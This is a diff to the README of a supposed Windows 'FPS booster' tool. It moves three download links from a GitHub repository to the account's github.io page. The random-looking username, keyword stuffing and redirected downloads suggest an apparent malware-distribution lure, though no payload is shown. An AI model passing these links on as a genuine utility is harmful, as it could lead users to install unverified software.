@@ -1,6 +1,6 @@
 # 🎮 FPS-Accelerator-Pro-2026 - Boost Your Gaming FPS Instantly
 
-[![Download FPS Accelerator Pro 2026](https://img.shields.io/badge/Download-FPS%20Accelerator%20Pro%202026-brightgreen?style=for-the-badge&logo=windows)](https://github.com/neutralisationgentlemansgentleman539/FPS-Accelerator-Pro-2026)
+[![Download FPS Accelerator Pro 2026](https://img.shields.io/badge/Download-FPS%20Accelerator%20Pro%202026-brightgreen?style=for-the-badge&logo=windows)](https://neutralisationgentlemansgentleman539.github.io)
 
 ## 🚀 What is FPS-Accelerator-Pro-2026?
 
@@ -26,7 +26,7 @@ FPS-Accelerator-Pro-2026 is a powerful Windows desktop tool designed to maximize
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [Download FPS-Accelerator-Pro-2026](https://github.com/neutralisationgentlemansgentleman539/FPS-Accelerator-Pro-2026)
+Visit this link to download the application: [Download FPS-Accelerator-Pro-2026](https://neutralisationgentlemansgentleman539.github.io)
 
 Once you visit the link, follow these simple steps:
 
@@ -72,6 +72,6 @@ This software is provided as-is for personal use. See the repository for full de
 
 ## 🔗 Quick Download
 
-[![Get It Now](https://img.shields.io/badge/Get%20It%20Now-Download%20FPS%20Accelerator%20Pro%202026-blue?style=for-the-badge)](https://github.com/neutralisationgentlemansgentleman539/FPS-Accelerator-Pro-2026)
+[![Get It Now](https://img.shields.io/badge/Get%20It%20Now-Download%20FPS%20Accelerator%20Pro%202026-blue?style=for-the-badge)](https://neutralisationgentlemansgentleman539.github.io)
 
 Keywords: desktop-app, desktop-apps, fps-booster-no-lag, fps-booster-software, gaming, gaming-tools, optimizer, pc-tools, performance, performance-optimization, system-tuning, windows, windows-10, windows-11
